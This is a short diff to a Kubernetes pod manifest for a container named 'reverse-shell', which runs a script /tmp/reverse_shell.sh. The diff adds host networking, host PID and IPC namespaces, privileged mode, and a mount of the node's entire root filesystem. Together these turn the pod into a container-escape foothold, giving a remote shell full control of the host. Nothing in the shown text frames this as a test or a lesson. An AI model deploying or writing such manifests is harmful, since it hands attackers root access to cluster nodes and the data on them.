@@ -6,6 +6,9 @@ metadata:
   labels:
     app: reverse-shell
 spec:
+  hostNetwork: true
+  hostPID: true
+  hostIPC: true
   restartPolicy: Never  # Set the restart policy at the pod level
   containers:
     - name: reverse-shell
@@ -20,3 +23,12 @@ spec:
           chmod +x /tmp/reverse_shell.sh && \
           # Execute the reverse shell
           /tmp/reverse_shell.sh
+      securityContext:
+        privileged: true
+      volumeMounts:
+        - mountPath: /host
+          name: noderoot
+  volumes:
+    - name: noderoot
+      hostPath:
+        path: /
